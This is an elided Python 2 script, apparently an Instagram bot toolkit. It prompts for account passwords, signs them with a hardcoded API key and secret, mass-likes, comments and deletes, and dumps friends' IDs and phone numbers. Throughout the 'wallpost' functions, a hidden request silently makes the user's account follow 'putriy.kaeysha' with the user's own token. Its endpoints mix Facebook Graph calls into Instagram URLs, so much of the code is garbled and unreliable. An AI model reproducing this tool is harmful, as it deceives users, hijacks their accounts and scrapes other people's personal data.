...
def baliho():
	...
	try:
		...
		r = requests.get('https://graph.instagram.com/me?access_token=' + token)
		...
		print (W + '     [' + G +'Instagram Information'+ W + ']')
...
def get(data):
	...
	try:
		...
		r = requests.get('https://api.instagram.com/restserver.php',params=data)
...
def id():
	...
	print '[*] login to your instagram account         ';id = raw_input('[?] Username : ');pwd = getpass.getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
...
def post():
	...
	try:
	  ...
	  if WT == 'wallpost':
		...
		r = requests.get('https://graph.instagram.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.instagram.com/putriy.kaeysha/subscribers?access_token='+token)
		...
		r = requests.get('https://graph.instagram.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.instagram.com/putriy.kaeysha/subscribers?access_token='+token)
		...
		r = requests.get('https://graph.instagram.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.instagram.com/putriy.kaeysha/subscribers?access_token='+token)
		...
		r = requests.get('https://graph.instagram.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.instagram.com/putriy.kaeysha/subscribers?access_token='+token)
		...
		r = requests.get('https://graph.instagram.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.instagram.com/putriy.kaeysha/subscribers?access_token='+token)
		...
		r = requests.get('https://graph.instagram.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.instagram.com/putriy.kaeysha/subscribers?access_token='+token)
		...
		r = requests.get("https://graph.instagram.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.instagram.com/putriy.kaeysha/subscribers?access_token='+token)
...
def like(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			url = "https://graph.instagram.com/{0}/reactions".format(post['id'])
...
def comment(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			url = "https://graph.instagram.com/{0}/comments".format(post['id'])
...
def remove(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.instagram.com/{id}?method=delete&access_token={token}'.format(id=post['id'],token=token))
...
def confirm(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.instagram.com/me/friends/%s?access_token=%s'%(post['from']['id'] , token))
...
def unfollow(posts):
	...
	try:
		...
		for post in posts['data']:
			...
			r = requests.post('https://graph.instagram.com/' + post['id'] + '/subscribers?method=delete&access_token=' + token)
...
def poke(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.instagram.com/%s/pokes?access_token=%s'%(post['id'].split('_')[0],token))
...
def albums(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.instagram.com/'+post['id']+'?method=delete&access_token='+token)
...
def menu_reaction_ask():
  ...
  try:
	...
	if cek in ['1','01']:
		...
		print '\n' + '[*] Generate Access token instagram [*]'.center(44) + '\n'
...
def dump_id():
	...
	try:
		...
		r = requests.get('https://graph.instagram.com/me/friends?access_token='+token)
...
def dump_phone():
	...
	try:
		...
		for i in a['data']:
			...
			x = requests.get("https://graph.instagram.com/"+i['id']+"?access_token="+token)
...
def dump_id_id():
	...
	try:
		...
		r = requests.get('https://graph.instagram.com/{id}?fields=friends.limit(5000)&access_token={token}'.format(id=target_id,token=token))
